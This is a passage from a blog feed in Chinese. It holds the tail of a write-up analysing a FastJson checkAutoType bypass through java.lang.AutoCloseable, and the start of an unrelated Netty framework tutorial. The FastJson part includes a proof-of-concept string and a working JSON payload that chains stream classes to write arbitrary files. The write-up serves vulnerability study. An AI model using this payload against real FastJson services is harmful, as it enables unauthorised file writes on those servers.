/></p><p>这个功能默认false是关闭的，如果你开启了，那就会完全禁用<code>autoType</code>从而完全避免开启了autoType的类型的攻击。当然也要考虑业务需求。</p><p><strong>然而</strong>，该版本仍然存在绕过<code>autoType</code>的漏洞。我们重新回到47版本中的if分支地方：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502142605878.png" /></p><p>上面的分支我们已经没有办法利用了，在黑白名单判断之前，还有一个分支也就是红框圈出的地方。这个expectClass是什么来头？</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502191335633.png" /></p><p>可以看到是checkAutoType传入的，而默认的传入是null：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502194040334.png" /></p><p>而在红框判断中，<strong>若expectClass为空，则直接返回clazz供反序列化；若expectClass非空则若：</strong></p><ul><li>不是HashMap类型 <strong>且</strong></li><li>属于待反序列化的类的子类(<code>isAssignableFrom</code>方法用于判断参数是否是当前对象的子类)</li></ul><p>就会直接返回clazz供反序列化。那我们大致思路有了，其实和47版本的<strong>两阶段</strong>是类似的：</p><ol type="1"><li>首先反序列化一个类，此时expectClass为空，并正常返回clazz供反序列化。</li><li>反序列化第二个类时，令这个类是我们传入的第一个类的子类，从而绕过这个抛出异常语句而直接返回。</li></ol><p><strong>有没有什么办法在第一次checkAutoType后，再次进入checkAutoType并传入expectClass以返回恶意类呢？</strong>答案是使用<code>java.lang.AutoCloseable</code>接口类。我们先用如下输入测试一下流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/4/26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;: \&quot;java.io.FileOutputStream\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">pocObj</span> <span class="operator">=</span> JSONObject.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200306317.png" /></p><p>可以看到Mapping中是有这个类的，并正常返回：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200402334.png" /></p><p>准备反序列化，这里会使用<code>paser.deserializer.JavaBeanDeserializer</code>来做反序列化工作：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200716098.png" /></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200745231.png" /></p><p>进入后，来到如下代码片段：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502202532059.png" /></p><p>注意，此时已经开始要解析第二个类了。构造上我们选取了FileOutputStream，他实现了<code>AutoCloseable</code>接口，红框中可以看到，<code>expectClass</code>此时为我们传入的第一个接口类，然后准备进入<code>checkAutoType</code>函数。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502203841789.png" /></p><p>进入之后，由于不存在于黑名单、也不是mapping中的，因此略过前面判断以及黑白名单扫描，到达上图代码位置。由于expectClass非空、且clazz(此处为<code>FileOutputStream</code>)为expectClass的子类，因此会将这个类添加到mapping中并返回。</p><p><strong>至此，我们其实是实现了47版本漏洞中第一阶段的效果：污染mapping。</strong>后面再跟一个待反序列化的恶意类从而构成gadget就可以利用了。</p><p><strong>但是，有一个条件，这样的利用方式就要求恶意类必须实现了AutoCloseable接口。</strong>最典型的、直观能想到的，那肯定就是文件类了，但是<code>FileOutputStream</code>的构造器指向的是文件，不能添加一些其他可控的参数，比如写入什么内容。因此网上可以看到一些人的文章都会使用<code>FileOutputStream</code>的子类或类似的其他类，这一部分的话通常可以实现比如任意文件写入：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;@type&#x27;<span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;@type&#x27;<span class="punctuation">:</span> &#x27;sun.rmi.server.MarshalOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;out&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        &#x27;@type&#x27;<span class="punctuation">:</span> &#x27;java.util.zip.InflaterOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">        &#x27;out&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            &#x27;@type&#x27;<span class="punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">            &#x27;file&#x27;<span class="punctuation">:</span> &#x27;dst&#x27;<span class="punctuation">,</span></span><br><span class="line">            &#x27;append&#x27;<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;infl&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            &#x27;input&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                &#x27;array&#x27;<span class="punctuation">:</span> &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<span class="punctuation">,</span></span><br><span class="line">                &#x27;limit&#x27;<span class="punctuation">:</span> <span class="number">22</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;bufLen&#x27;<span class="punctuation">:</span> <span class="number">1048576</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;protocolVersion&#x27;<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="fastjson-1.2.80">FastJson 1.2.80</h1><p>这应该是FastJson1.2.x最新的漏洞信息了，提示用户应该尽快升级到最新的1.2.83版本。</p><blockquote><p>安全说明：<ahref="https://github.com/alibaba/fastjson/wiki/security_update_20220523">security_update_20220523· alibaba/fastjson Wiki (github.com)</a></p></blockquote><h1 id="参考">参考</h1><p>https://su18.org/post/fastjson</p><p><a href="https://y4er.com/posts/fastjson-learn/">Fastjson反序列化RCE分析 - Y4er的博客</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;紧跟&lt;a
href=&quot;https://lzwgiter.github.io/posts/c99165fd.html&quot;&gt;上一篇&lt;/a&gt;，继续补一下fastjson的审计，复现和分析范围包括1.2.47-1.2.80。&lt;/p&gt;
&lt;p&gt;&lt;img
src=&quot;/img/fastjson反序列化漏洞学习（二）/33f3fdfdbd7163516bd4eb85bbcb34a7.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="https://lzwgiter.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞分析" scheme="https://lzwgiter.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="web安全" scheme="https://lzwgiter.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Netty框架学习</title>
    <link href="https://lzwgiter.github.io/posts/73d00ee7.html"/>
    <id>https://lzwgiter.github.io/posts/73d00ee7.html</id>
    <published>2023-01-07T12:20:38.000Z</published>
    <updated>2023-07-08T13:03:49.107Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇学习一下Netty框架，Netty是一个Java实现的、非常流行的NIO网络编程框架，很多知名项目如a阿里的Dubbo、Spark、ElasticSearch、Hadoop、蚂蚁金服的SOFABolt、谷歌的gRPC等等。学习前建议先掌握Java中NIO相关API的使用，并理解Unix操作系统中I/O多路复用模型的理论。</p><p><img src="/img/Netty框架学习/components.png" alt="components" style="zoom:100%;" /></p></blockquote><span id="more"></span><h1id="什么是netty为了解决什么问题">什么是Netty？为了解决什么问题？</h1><h2 id="netty">Netty</h2><p>引用一下官方的描述：</p><blockquote><p>Netty is an NIO client server framework which enables quick and easydevelopment of network applications such as protocol servers andclients. It greatly simplifies and streamlines network programming suchas TCP and UDP socket server.</p><p>Netty是一个NIO客户机-服务器框架，它可以快速方便地开发网络应用程序，如协议服务器和客户端。它大大简化和简化了网络编程，如TCP和UDP套接字服务器。</p></blockquote><p>Netty本身其实是一个基于JavaNIO开发的框架，帮助我们快速开发网络应用而不需要在处理通信流程上花心思。也正因为这样，他也不需要啥其他的依赖，就靠JDK自身就行。Netty3.x版本最低要求为JDK 5而Netty 4.x的最低要求是JDK 6。</p><h2 id="解决什么问题呢">解决什么问题呢？</h2><p>我自己的理解。看似是个简单的封装，实际上Netty是有很多的创新点的。首先，他使得我们免于编写大量关于JavaNIO代码的，这部分涉及到熟悉常用类、多线程编程、JDK 1.7及之前中的epollbug等等，这大大降低了我们开发的复杂度。其次，他的性能是要比Java原生的性能要更好的，具体来说：</p><ul><li>更高的吞吐量以及更低的延迟</li><li>更低的资源消耗</li><li>更少的内存复制（Zero-Copy技术）</li></ul><p>那他是怎么解决的呢？我自己的理解总结一句话是这样的：</p><blockquote><p>Netty是基于多路I/O复用机制实现了同步非阻塞I/O模型，此外，通过运用多线程技术，实现了伪异步的能力。</p></blockquote><p>正儿八经的，Netty的出现的理由，除了我上面提到的，就是官方自己的陈述：</p><blockquote><p>...... However, a general purpose protocol or its implementationsometimes does not scale very well. It is like how we don't use ageneral purpose HTTP server to exchange huge files, e-mail messages, andnear-realtime messages such as financial information and multiplayergame data. What's required is a highly optimized protocol implementationthat is dedicated to a special purpose. ......</p><p><em><a href="https://netty.io/">The Netty project</a></em> is aneffort to provide an asynchronous event-driven network applicationframework and tooling for the rapid development of maintainablehigh-performance and high-scalability protocol servers and clients.</p><p>In other words, Netty is an NIO client server framework that enablesquick and easy development of network applications such as protocolservers and clients. It greatly simplifies and streamlines networkprogramming such as TCP and UDP socket server development.</p><p>'Quick and easy' does not mean that a resulting application willsuffer from a maintainability or a performance issue. Netty has beendesigned carefully with the experiences learned from the implementationof a lot of protocols such as FTP, SMTP, HTTP, and various binary andtext-based legacy protocols. As a result, Netty has succeeded to find away to achieve ease of development, performance, stability, andflexibility without a compromise.</p></blockquote><p>大俗话翻译一下：</p><blockquote><p>......然而，通用协议及其实现，如HTTP，他的可扩展性不强。比如我们也不是整天起一个HTTP服务器，然后跟别人交换文件、邮件、实时信息等。为啥子？具体问题具体讨论嘛，我们需要根据具体的需求去设计、去优化得到一个定制化的协议，不然要FTP、SMTP啥的干啥？......</p><p>Netty是一个基于异步事件驱动的网络应用框架，旨在提供可快速开发的、可维护的、高性能、高可扩展的服务器和客户端。</p><p>换言之，Netty是一个使用了NIO的客户端服务器框架爱，能让你快速开发网络应用，比如TCP、UDP套接字开发，肥肠好用。</p><p>虽然但是并不是说Netty快、简单，就代表着它可维护性差、性能差，Netty吸取了诸多前辈协议的实现经验，比如FTP、SMTP、HTTP和其他五花八门的协议。总而言之，很牛。</p></blockquote><h1 id="深入浅出整体架构与基本概念">深入浅出——整体架构与基本概念</h1><h2 id="netty整体架构">Netty整体架构</h2><p>下面我们先深入浅出的看一下Netty是怎么设计的。过程如下：</p><ul><li>首先，我们需要了解一下什么是Reactor模式</li><li>然后看看Netty大体架构设计、流程以及常用类</li><li>看一个简单的Demo，实现时间服务器的功能</li></ul><h3 id="不得不提的reactor模式">不得不提的Reactor模式</h3><p><code>Reactor</code>意思是反应堆，这个倒不是Java的常见24种设计模式，只是一种I/O模式。wiki定义如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The reactor design pattern is an event handling pattern for handling service requests delivered concurrently to a service handler by one or more inputs. The service handler then demultiplexes the incoming requests and dispatches them synchronously to the associated request handlers.</span><br></pre></td></tr></table></figure><p>Reactor模式是一种事件驱动的I/O模式，核心分为服务句柄(<code>service handlers</code>)和请求句柄(<code>reuest handlers</code>)，前者可以处理并发到达的多个输入，并通过后者同步地**将请求派发(dispatch)给不同的请求句柄。其实有点类似生产者消费者模型，只不过没有缓存，而是直接派发了。可以用下图理解：</p><figure><img src="/img/Netty框架学习/Reactor模式.png" alt="Reactor模式" /><figcaption aria-hidden="true">Reactor模式</figcaption></figure><p>其中（我们带入Java语境），<code>Service Handler</code>本质是一个Selector，轮询可用Socket，并将I/O事件分配给<code>Request Handler</code>，在线程池中以<strong>非阻塞的方式</strong>处理用户请求的线程,。下图会更加清晰(来自Java之父Doug Lea，<ahref="http://gee.cs.oswego.edu/dl/cpjslides/nio.pdf">地址</a>)</p><figure><img src="/img/Netty框架学习/image-20230110222829890.png"alt="经典服务模式" /><figcaption aria-hidden="true">经典服务模式</figcaption></figure><p>那中间这个<code>Service Handler</code>我们就把他叫做<code>Reactor</code>，是不是就和一个小的反应堆一样在那里工作？Reactor模式具体来说有三种：</p><ul><li><p>单Reactor单线程模式</p><p><img src="/img/Netty框架学习/image-20230110225253683.png" /></p><p>在该模式下，单个Reactor线程利用Selector进行工作，当监听到客户端连接时，将利用dispatch函数，首先通过acceptor接收一个客户端，再通过handler进行处理客户端的读写。而acceptor和handler的执行都是在<strong>同一个线程中的</strong>，而非新建了一个线程（如下代码，直接<code>run</code>而并非新建了<code>Thread</code>)。</p><p><img src="/img/Netty框架学习/image-20230110230451813.png" /></p><p>这个模式可以满足一些小容量的场景。但是难以满足高负载、大并发的场景，即<strong>可扩展性差</strong>。</p><p>从上面这个模式可以看到，若handler的流程过长，则会拖累reactor，严重会导致大量客户端连接超时的问题。此外，若该单线程除了问题，则会导致<strong>单点失效</strong>的问题。因此我们可以</p><ol type="1"><li><strong>加快handler的执行</strong>，如使用多线程执行不同的非阻塞IO。</li><li><strong>使用多个Reactor，</strong>不同Reacor之间负载均衡。</li></ol><p>上面这两个思路都可以提高我们的<strong>可扩展性（Scalability）</strong>，即可以容纳更大的流量。那其实另外两个模式就分别走的是上面这两个思路了。</p></li><li><p>单Reactor多线程模式</p><p><img src="/img/Netty框架学习/image-20230110231021841.png" /></p><p>相较于第一种模式，可以看到，我们在下面增加了一个<strong>线程池</strong>来处理handler，这个还是比较好理解的。</p><p>绝大数场景下，该模式都可以满足性能要求。但极特殊场景下，由于是单个Reactor线程负责监听和处理客户端连接，因此例如百万客户端并发连接、或存在认证等时间开销较大的流程。那单个Reactor就不够了。就得引入<strong>多个Reactor</strong>了。</p></li><li><p>多Reactor多线程模式</p></li></ul><p><img src="/img/Netty框架学习/image-20230110231037066.png" /></p><p>这也是Netty经常采用的Reacor模式了，官方也推荐使用该模型。观察一下有两个特点：</p><ol type="1"><li><strong>有线程池</strong>，即多线程处理客户端请求。</li><li><strong>有两个Reactor</strong>，所以也有人把这个叫<strong>主从Reactor模式</strong>、<strong>1+M+N线程模式</strong>，每一个Reactor都可以是一个线程池。是<strong>业界成熟的服务器程序设计模式</strong>。</li></ol><h3 id="netty架构概览">Netty架构概览</h3><p>Netty整体可以分为三层：服务编排层、事件调度层、网络通信层。如图所示：</p><figure><img src="/img/Netty框架学习/image-20230111001518439.png"alt="Netty三层架构" /><figcaption aria-hidden="true">Netty三层架构</figcaption></figure><p>分别职责如下：</p><ul><li>服务编排层：负责组装各类服务，是Netty的核心业务处理链（可以看到Pipeline字样）</li><li>事件调度层：通过指定的Reactor线程模型，对活动事件进行处理，具体交由相关Handler完成</li><li>网络通信层：监听网络的读写和连接请求，负责将网络层的数据读取到内存缓冲区中。</li></ul><p>ok上面叭叭叭一堆类，其实最下面的网络通信层除了<code>ServerBootstrap</code>，看过我<ahref="https://lzwgiter.github.io/posts/d6b305b7.html">文章</a>的应该已经熟悉了。</p><p>简单说一下，<code>ServerBootstrap</code>类的创建是Netty服务端启动的第一步，即通过Builder模式构建一个服务端类，配置其相关参数，并绑定端口启动。网络通信层就这些内容了。我们从下到上，再看看另外两层：</p><h4 id="事件调度层">事件调度层</h4><p>上面说到，该层的职责是利用<strong>Reactor线程模型</strong>对活动事件进行处理，他的具体实现是与我们采用的Reactor线程模型相关的，比如你用了单Reactor单线程呀、单Reactor多线程呀等那三种。具体来说，是通过<code>ServerBootstrap</code>类指定的。</p><p>核心用到的类有两个：<code>EventLoop</code>和<code>EventLoopGroup</code>。是不是感觉有点<code>Thead</code>和<code>ThreadGroup</code>那味？差不多。下图是这两个类的关系图：</p><figure><img src="/img/Netty框架学习/EventLoopGroup与EventLoop.png"alt="EventLoopGroup与EventLoop" /><figcaption aria-hidden="true">EventLoopGroup与EventLoop</figcaption></figure><p>可以看到而这都继承了<code>EventExecutorGroup</code>接口，而该接口是由JDK提供的<code>ScheduledExecutorServer</code>子接口以及<code>Iterable</code>接口组成的。</p><p>本质上，<code>EventLoop</code>可以看做<strong>处理多个Channel生命周期内所有I/O时间的线程</strong>，而<code>EventLoopGroup</code>则是<strong>注册</strong>这些线程的线程池。而<code>EventLoopGroup</code>是有很多实现和用法的，这一点我们最后再讨论。总之这里知道，该层作用是<strong>根据所设定的Reactor线程模型，利用线程池技术监听和处理网络I/O事件</strong>就好了。</p><h4 id="服务编排层">服务编排层</h4><p>我觉得吧，这名字翻译的不太好，我以为是应用层的什么东西在编排，其实就是<strong>对信息流的拦截操作</strong>。你Servlet、Struts2啥的都有这种类似的设计。</p><p>该层负责组装各类服务，是Netty的核心业务处理链，确保网络事件的动态编排和有序传播。你是不是感觉在哪里听过？对的，类似Servlet技术的拦截过滤器<code>javax.servlet.Filter</code>，具体可以看我的文章：<ahref="https://lzwgiter.github.io/posts/b92dbb83.html#/使用过滤器">JavaEE基础- Servlet · float's blog (lzwgiter.github.io)</a>。</p><p>Netty是一样的原理。Netty将Channel抽象为<code>ChannelPipeline</code>，消息在该管道中流动。然后针对这个管道，我们定义了<strong>I/O事件</strong>的拦截器<code>ChannelHandler</code>（感觉叫<code>ChannelFilter</code>岂不是更好理解），而<code>ChannelPipeline</code>中保存了多个这样的“拦截器"。</p><p>既然是<strong>事件</strong>的拦截器，包含哪些事件呢？由于消息都是I/O的相关消息，所以事件都是与I/O相关的。从大类上可以分为<code>inbound</code>事件和<code>outbound</code>事件。前者通常为由I/O线程触发，后者通常为用户主动发起的网络I/O操作（其实和我们发起一个TCP请求的过程很像，绑定、连接、写、读、关闭）。</p><ul><li>inbound事件(*代表“ChannelHandlerContext”)：<ol type="1"><li>*.fireChannelRegistered() -&gt; Channel注册事件</li><li>*.fireChannelActive() -&gt; TCP链路建立成功，Channel激活事件</li><li>*.fireChannelRead(Object) -&gt; 读事件</li><li>*.fireChannelReadComplete() -&gt; 读操作完成通知事件</li><li>*.fireExceptionCaught(Throwable) -&gt; 异常通知事件</li><li>*.fireUserEventTriggered(Object) -&gt; 用户自定义事件</li><li>*.fireChannelWritabilityChanged() -&gt;Channel的可写状态变化通知事件</li><li>*.fireChannelInactive() -&gt; TCP连接关闭，链路不可用通知事件</li></ol></li><li>outbound事件(*代表“ChannelHandlerContext”)：<ol type="1"><li>*.bind(SocketAddress, ChannelPromise) -&gt; 绑定本地地址事件</li><li>*.connect(SocketAddress, SocketAddress, ChannelPromise) -&gt;连接服务端事件</li><li>*.write(Object, ChannelPromise) -&gt; 写事件</li><li>*.flush() -&gt; 刷新事件</li><li>*.read() -&gt; 读事件</li><li>*.disconnect(ChannelPromise) -&gt; 断开连接事件</li><li>*.close(ChannelPromise) -&gt; 关闭当前Channel事件</li></ol></li></ul><p>上面这些事件数量很多，但是也很好区分。<code>Inbound</code>那都是<code>In</code>了，肯定是消息进来引发的事件（注册channel、TCP握手、读、TCP关闭等），这些事件对应函数的命名都是<code>fire</code>开头的。<code>outbound</code>那肯定就是消息出去引发的事件了（写、刷新等）。</p><p>当我们用户的请求到达Netty后，首先Netty利用底层<code>SocketChannel</code>的read方法读取得到<code>ByteBuf</code>类型的数据。这一步触发了<code>ChannelRead</code>事件，由I/O线程（常用的如<code>NioEventLoop</code>）调用<code>ChannelPipeline</code>的<code>fireChannelRead(Object msg)</code>方法，将消息（<code>ByteBuf</code>类型）传递到<code>ChannelPipeline</code>中。</p><p>处理后，我们再调用<code>write</code>函数返回请求信息，此时会触发write事件，<strong>反方向</strong>经过各个拦截器返回。</p><p>上述<strong>出站和入站</strong>的流程如图所示：</p><p><img src="/img/Netty框架学习/image-20230112220058228.png" alt="ChannelPipeline对I/O事件流的拦截和处理" style="zoom: 80%;" /></p><p>通常，我们需要自己定义一个拦截器并添加到pipeline中。这个操作在Servlet中，我们需要实现<code>javax.servlet.Filter</code>接口，并实现对应的<code>doFilter</code>方法，然后添加注解<code>@WebFilter</code>或写xml文档就可以了。</p><p>那在Netty中（v4版本），对于上述两种不同的事件。对应地，我们需要继承不同的抽象类：</p><ul><li>inbound事件：<code>ChannelInboundHandlerAdapter</code>，下面是定义以及部分方法，我们只需要重写感兴趣的就行了。方法注释中表明了事件，如channelActive注释中<code>Calls &#123;@link ChannelHandlerContext#fireChannelActive()&#125;</code>，这和上面列出的事件是一一对应的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChannelInboundHandlerAdapter</span> <span class="keyword">extends</span> <span class="title class_">ChannelHandlerAdapter</span> <span class="keyword">implements</span> <span class="title class_">ChannelInboundHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelRegistered()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRegistered</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelRegistered();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelUnregistered()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelUnregistered</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelUnregistered();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelActive()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelActive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelActive();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelInactive()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelInactive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelInactive();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelRead(Object)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelRead(msg);</span><br><span class="line">    